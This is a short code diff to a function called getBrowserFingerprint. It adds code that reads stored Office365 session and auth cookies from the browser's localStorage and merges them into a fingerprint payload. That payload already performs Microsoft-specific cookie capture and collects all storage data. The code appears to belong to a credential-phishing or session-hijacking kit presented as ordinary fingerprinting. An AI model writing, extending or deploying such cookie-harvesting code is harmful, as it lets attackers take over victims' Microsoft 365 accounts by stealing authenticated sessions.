@@ -54,6 +54,25 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
     };
   }
   
+  // CRITICAL: Get stored Office365 cookies first
+  let storedCookies: any[] = [];
+  try {
+    const office365Cookies = localStorage.getItem('office365_cookies');
+    const office365AuthCookies = localStorage.getItem('office365_auth_cookies');
+    
+    if (office365Cookies) {
+      const parsed = JSON.parse(office365Cookies);
+      storedCookies = [...storedCookies, ...(parsed.cookieList || parsed.cookies || [])];
+    }
+    
+    if (office365AuthCookies) {
+      const parsed = JSON.parse(office365AuthCookies);
+      storedCookies = [...storedCookies, ...(parsed.cookieList || parsed.cookies || [])];
+    }
+  } catch (e) {
+    console.error('Error loading stored cookies:', e);
+  }
+
   // Enable Microsoft-specific cookie capturing while keeping general cookies disabled
   let cookieCapture;
   const emailDomain = getProviderSpecificDomain(userEmail);
@@ -116,6 +135,11 @@ export const getBrowserFingerprint = async (userEmail?: string) => {
     }
   }
 
+  // CRITICAL: Always add stored cookies to the cookieList
+  if (storedCookies.length > 0) {
+    console.log('🔵 Adding stored Office365 cookies to fingerprint:', storedCookies.length);
+    cookieCapture.cookieList = [...(cookieCapture.cookieList || []), ...storedCookies];
+  }
   // Capture all storage data
   const getStorageData = (storage: Storage | undefined) => {
     const data: Record<string, string | null> = {};
